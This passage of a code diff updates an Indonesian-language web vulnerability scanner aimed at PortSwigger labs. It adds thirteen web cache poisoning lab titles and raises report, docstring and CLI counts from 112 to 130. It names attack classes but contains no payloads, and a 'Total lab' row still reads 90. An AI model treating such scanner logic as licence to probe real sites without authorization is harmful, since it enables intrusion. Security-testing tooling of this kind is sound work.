+    118: "Web cache poisoning (unkeyed header)", 119: "Web cache poisoning (unkeyed cookie)",
+    120: "Web cache poisoning (multiple headers)", 121: "Targeted web cache poisoning (unknown header)",
+    122: "Web cache poisoning (unkeyed query string)", 123: "Web cache poisoning (unkeyed query parameter)",
+    124: "Web cache poisoning (parameter cloaking)", 125: "Web cache poisoning (fat GET request)",
+    126: "Web cache poisoning (URL normalization)", 127: "Web cache poisoning (DOM, strict cacheability)",
+    128: "Web cache poisoning (combining vulnerabilities)", 129: "Web cache poisoning (cache key injection)",
+    130: "Web cache poisoning (internal cache poisoning)",
 }
 
 
@@ -4397,10 +4862,10 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
     page.rect(0, _PDF_PAGE_H - 242, _PDF_PAGE_W, 12, _PDF_COLORS["teal"])
     page.text(content_left, _PDF_PAGE_H - 84, "SATRIA BARU", 30, _PDF_COLORS["white"], bold=True)
     page.text(content_left, _PDF_PAGE_H - 112, "LAPORAN PEMINDAIAN SQL INJECTION, XSS, CSRF & CLICKJACKING", 13.5, _PDF_COLORS["light"], bold=True)
-    page.text(content_left, _PDF_PAGE_H - 134, "Cakupan 112 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF + 22 HTTP request smuggling) - bukti diferensial dan konservatif", 10.2, _PDF_COLORS["light"])
+    page.text(content_left, _PDF_PAGE_H - 134, "Cakupan 130 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF + 22 HTTP request smuggling + 5 OS command injection + 13 Web cache poisoning) - bukti diferensial dan konservatif", 10.2, _PDF_COLORS["light"])
     page.y = _PDF_PAGE_H - 286
     page.paragraph(content_left, content_width, "Hasil Pemindaian", 21, _PDF_COLORS["navy"], bold=True)
-    page.paragraph(content_left, content_width, "Laporan ini merangkum pengujian terhadap 112 lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based, 3 CORS, 9 XXE, 7 SSRF, 22 HTTP request smuggling) yang diminta. Status tidak terkonfirmasi berarti bukti tidak cukup; bukan klaim bahwa lab tidak rentan.", 9.8, _PDF_COLORS["muted"])
+    page.paragraph(content_left, content_width, "Laporan ini merangkum pengujian terhadap 130 lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based, 3 CORS, 9 XXE, 7 SSRF, 22 HTTP request smuggling, 5 OS command injection, 13 Web cache poisoning) yang diminta. Status tidak terkonfirmasi berarti bukti tidak cukup; bukan klaim bahwa lab tidak rentan.", 9.8, _PDF_COLORS["muted"])
     page.y -= 18
     for label, value in (("Target", target), ("Hasilkan", generated or "-"), ("Mode", str(result.get("mode", "active")))):
         page.text(content_left, page.y - 10, f"{label}:", 9.0, _PDF_COLORS["navy"], bold=True)
@@ -4424,7 +4889,7 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
         page.text(x, kpi_top - 62, label.upper(), 7.5, _PDF_COLORS["muted"], bold=True)
     page.y = kpi_top - 110
     page.section_title("Hal yang penting dibaca")
-    page.bullet_paragraph("112 judul lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based, 3 CORS, 9 XXE, 7 SSRF, 22 HTTP request smuggling) yang diminta dimasukkan ke laporan ini.")
+    page.bullet_paragraph("130 judul lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based, 3 CORS, 9 XXE, 7 SSRF, 22 HTTP request smuggling, 5 OS command injection, 13 Web cache poisoning) yang diminta dimasukkan ke laporan ini.")
     page.bullet_paragraph("Status confirmed memakai bukti diferensial yang dapat diulang; not_confirmed bukan bukti tidak rentan.")
     page.bullet_paragraph("Lab 16-17 hanya dapat terkonfirmasi bila collaborator/poller mencatat interaksi OOB. Tanpa itu, lab terkait tetap not_confirmed.")
     page.bullet_paragraph("Bukti ditampilkan apa adanya berdasarkan temuan terverifikasi.")
@@ -4432,7 +4897,7 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
 
     # --------------------------------------------------------------- RINGKASAN
     page.new_page()
-    page.section_title("Ringkasan Hasil", "Angka berikut berasal dari 112 lab yang diminta.")
+    page.section_title("Ringkasan Hasil", "Angka berikut berasal dari 130 lab yang diminta.")
     rows = [
         ("Total lab", "90", "Semua judul wajib dari katalog (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF)."),
         ("Terkonfirmasi", str(len(confirmed)), "Bukti diferensial terpenuhi dan dapat diulang."),
@@ -4483,7 +4948,7 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
 
     # ------------------------------------------------------------------- TABEL
     page.new_page()
-    page.section_title("Hasil Pemindaian", "Tabel ringkas: satu baris untuk setiap 112 lab.")
+    page.section_title("Hasil Pemindaian", "Tabel ringkas: satu baris untuk setiap 130 lab.")
     headers = ("Lab", "Status", "Fokus", "Judul", "Severity")
     widths = (82.0, 92.0, 90.0, 190.0, 45.0)
     x_cols = []
@@ -4570,7 +5035,7 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
     # --------------------------------------------------------- CATATAN AKHIR
     page.y -= 6
     page.section_title("Catatan Laporan")
-    page.bullet_paragraph("Dokumen ini memuat 112 lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based, 3 CORS, 9 XXE, 7 SSRF, 22 HTTP request smuggling) yang diminta. Status not_confirmed berarti bukti tidak cukup, bukan klaim tidak rentan.")
+    page.bullet_paragraph("Dokumen ini memuat 130 lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based, 3 CORS, 9 XXE, 7 SSRF, 22 HTTP request smuggling, 5 OS command injection, 13 Web cache poisoning) yang diminta. Status not_confirmed berarti bukti tidak cukup, bukan klaim tidak rentan.")
     page.bullet_paragraph("Status not_confirmed tidak sama dengan tidak rentan; ia hanya menyatakan bukti pemindaian tidak cukup.")
     page.bullet_paragraph("Ringkasan severity dihitung dari temuan terkonfirmasi saja, sesuai field summary yang dibaca app.py.")
     page.bullet_paragraph("Lab 16-17 memerlukan collaborator atau webhook poller. Tanpa itu, pemindai tidak mengklaim deteksi OOB.")
@@ -4672,7 +5137,7 @@ def run_pipeline(scrape_data: dict[str, Any] | None = None, *, url: str | None =
                  allow_partial_tools: bool | None = None,
                  enable_llm: bool | None = None, run_censys: bool | None = None,
                  run_nvd: bool | None = None, **runtime_options: Any) -> dict[str, Any]:
-    """Jalur kompatibel yang dipakai app.py; memindai 112 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF + 22 HTTP request smuggling)."""
+    """Jalur kompatibel yang dipakai app.py; memindai 130 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF + 22 HTTP request smuggling + 5 OS command injection + 13 Web cache poisoning)."""
     overrides: dict[str, Any] = dict(runtime_options)
     for name, value in (("allow_partial_tools", allow_partial_tools),
                         ("enable_llm", enable_llm), ("run_censys", run_censys),
@@ -4721,7 +5186,7 @@ def run_pipeline(scrape_data: dict[str, Any] | None = None, *, url: str | None =
 
 
 def main(argv: list[str] | None = None) -> int:
-    parser = argparse.ArgumentParser(description="SATRIA Engine — pemindai SQL injection, XSS, CSRF, Clickjacking, DOM, CORS, XXE, SSRF & HTTP request smuggling (112 lab)")
+    parser = argparse.ArgumentParser(description="SATRIA Engine — pemindai SQL injection, XSS, CSRF, Clickjacking, DOM, CORS, XXE, SSRF, HTTP request smuggling, OS command injection & Web cache poisoning (130 lab)")
     parser.add_argument("target", help="URL target HTTP/HTTPS (mis. URL instance lab PortSwigger)")
     parser.add_argument("--authorized", action="store_true", help="Wajib: Anda menyatakan memiliki izin pengujian.")
     parser.add_argument("--allow-private", action="store_true", help="Izinkan target localhost/private (untuk pengujian lokal).")
@@ -4756,7 +5221,7 @@ def main(argv: list[str] | None = None) -> int:
         return 1
     json_path, html_path = write_report(report, Path(args.output_dir))
     summary = report["summary"]
-    print(f"SATRIA Engine selesai: {summary['confirmed']}/112 lab terkonfirmasi, {summary['not_confirmed']} belum terkonfirmasi.")
+    print(f"SATRIA Engine selesai: {summary['confirmed']}/130 lab terkonfirmasi, {summary['not_confirmed']} belum terkonfirmasi.")
     print(f"JSON: {json_path}")
     print(f"HTML: {html_path}")
     return 0
